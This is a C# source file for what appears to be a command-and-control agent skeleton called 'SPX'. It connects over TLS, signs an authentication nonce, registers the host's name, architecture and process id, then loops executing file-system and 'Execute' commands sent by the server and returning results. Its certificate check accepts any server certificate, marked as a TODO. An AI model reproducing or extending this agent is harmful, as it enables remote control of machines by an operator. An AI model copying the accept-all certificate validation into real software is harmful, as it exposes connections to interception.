using System.Net.Security;
using System.Net.Sockets;
using System.Text.Json;

namespace SpxAgent;

// SPX client skeleton: TLS connect -> AUTH -> REG(session) -> PING loop.
// CMD frames received from the server are currently just logged; wire your
// command handlers into HandleCommandAsync (registry names from server
// spxMsgConstructors: Ping, LsReq/Ls, ExecuteReq/Execute, ...).
public sealed class SpxClient : IDisposable
{
    private readonly string _host;
    private readonly int _port;
    private readonly AgentIdentity _identity;
    private readonly TcpClient _tcp;
    private readonly SslStream _ssl;

    public string? SessionId { get; private set; }

    private SpxClient(string host, int port, AgentIdentity identity, TcpClient tcp, SslStream ssl)
    {
        _host = host;
        _port = port;
        _identity = identity;
        _tcp = tcp;
        _ssl = ssl;
    }

    public static async Task<SpxClient> ConnectAsync(string host, int port, AgentIdentity identity)
    {
        var tcp = new TcpClient();
        await tcp.ConnectAsync(host, port);
        var ssl = new SslStream(tcp.GetStream(), leaveInnerStreamOpen: false, userCertificateValidationCallback: ValidateServerCertificate);
        await ssl.AuthenticateAsClientAsync(new SslClientAuthenticationOptions
        {
            TargetHost = host,
            EnabledSslProtocols = System.Security.Authentication.SslProtocols.Tls12 | System.Security.Authentication.SslProtocols.Tls13,
        });
        return new SpxClient(host, port, identity, tcp, ssl);
    }

    // ValidateServerCertificate - TODO: pin the server certificate (or the
    // MtlsServerCA) here instead of accepting anything. The server certificate
    // is signed by the mTLS server CA; extract its PEM from the server and
    // validate the chain.
    private static bool ValidateServerCertificate(object sender, System.Security.Cryptography.X509Certificates.X509Certificate? certificate,
        System.Security.Cryptography.X509Certificates.X509Chain? chain, SslPolicyErrors sslPolicyErrors)
    {
        return true; // SKELETON: accept-all. Replace with CA pinning.
    }

    // AuthenticateAsync - AUTH challenge-response.
    // Server sends {t:"AUTH", body:"<base64 nonce>"}; we reply with the Ed25519
    // signature over the nonce and await AUTH_OK.
    public async Task AuthenticateAsync()
    {
        var (challenge, _) = await Frame.ReadAsync(_ssl);
        if (challenge.T != "AUTH")
            throw new InvalidDataException($"expected AUTH challenge, got {challenge.T}");

        string nonceB64 = challenge.Body?.GetString() ?? throw new InvalidDataException("AUTH challenge missing nonce");
        byte[] nonce = Convert.FromBase64String(nonceB64);

        var authMsg = new Dictionary<string, string>
        {
            ["pubkey"] = _identity.PublicKeyHex,
            ["sig"] = _identity.SignBase64(nonce),
        };
        await Frame.WriteAsync(_ssl, new SpxHeader
        {
            T = "AUTH",
            I = Frame.NewId(),
            R = challenge.I,
            TS = Frame.NowMillis(),
            M = JsonSerializer.SerializeToElement(authMsg),
        });

        var (resp, _) = await Frame.ReadAsync(_ssl);
        if (resp.T != "AUTH_OK")
            throw new InvalidDataException($"AUTH failed: {resp.E}");
    }

    // RegisterAsync - REG (session mode, f=1). Returns the assigned session id.
    public async Task<string> RegisterAsync()
    {
        var meta = new Dictionary<string, object>
        {
            ["name"] = "spx-csharp-agent",
            ["hostname"] = Environment.MachineName,
            ["os"] = "windows",
            ["arch"] = System.Runtime.InteropServices.RuntimeInformation.ProcessArchitecture.ToString().ToLowerInvariant(),
            ["pid"] = Environment.ProcessId,
            ["version"] = "0.1-skeleton",
        };
        await Frame.WriteAsync(_ssl, new SpxHeader
        {
            T = "REG",
            I = Frame.NewId(),
            C = 0x0001,           // spxOpRegister
            F = 0x01,             // spxHdrModeSession
            TS = Frame.NowMillis(),
            M = JsonSerializer.SerializeToElement(meta),
        });

        var (resp, _) = await Frame.ReadAsync(_ssl);
        if (resp.T != "REG_OK")
            throw new InvalidDataException($"REG failed: {resp.E}");
        SessionId = resp.S;
        return SessionId ?? throw new InvalidDataException("REG_OK missing session id");
    }

    // PingAsync - send PING and await PONG echo.
    public async Task<bool> PingAsync(CancellationToken ct = default)
    {
        string id = Frame.NewId();
        await Frame.WriteAsync(_ssl, new SpxHeader { T = "PING", I = id, C = 0x0002, TS = Frame.NowMillis() });
        while (true)
        {
            var (hdr, _) = await Frame.ReadAsync(_ssl);
            if (hdr.T == "PONG" && hdr.R == id)
                return true;
            await HandleServerFrameAsync(hdr, Array.Empty<byte>());
        }
    }

    // RunAsync - read loop: dispatch inbound CMD/other frames until close.
    public async Task RunAsync(CancellationToken ct = default)
    {
        while (!ct.IsCancellationRequested)
        {
            var (hdr, payload) = await Frame.ReadAsync(_ssl);
            await HandleServerFrameAsync(hdr, payload);
        }
    }

    private async Task HandleServerFrameAsync(SpxHeader hdr, byte[] payload)
    {
        switch (hdr.T)
        {
            case "CMD":
                Console.WriteLine($"[+] CMD msg={hdr.Msg} id={hdr.I}");
                try
                {
                    var res = FsCommands.Dispatch(hdr.Msg ?? "", hdr.Body);
                    if (res is not null)
                    {
                        // RES frame echoes the request id; Msg is the response type.
                        await Frame.WriteAsync(_ssl, new SpxHeader
                        {
                            T = "RES",
                            R = hdr.I,
                            C = 0x0101,
                            TS = Frame.NowMillis(),
                            Msg = res.Value.Msg,
                            Body = res.Value.Body,
                        });
                    }
                    // null => command expects no response (e.g. CdReq).
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] command {hdr.Msg} failed: {ex.Message}");
                }
                break;
            case "DATA":
                Console.WriteLine($"[+] DATA stream k={hdr.K} len={payload.Length}");
                break;
            case "CLOSE":
                Console.WriteLine($"[+] CLOSE stream k={hdr.K}");
                break;
            case "ERR":
                Console.WriteLine($"[!] server ERR: {hdr.E}");
                break;
            default:
                Console.WriteLine($"[?] unhandled frame type {hdr.T}");
                break;
        }
        await Task.CompletedTask;
    }

    public void Dispose()
    {
        _ssl.Dispose();
        _tcp.Dispose();
    }
}
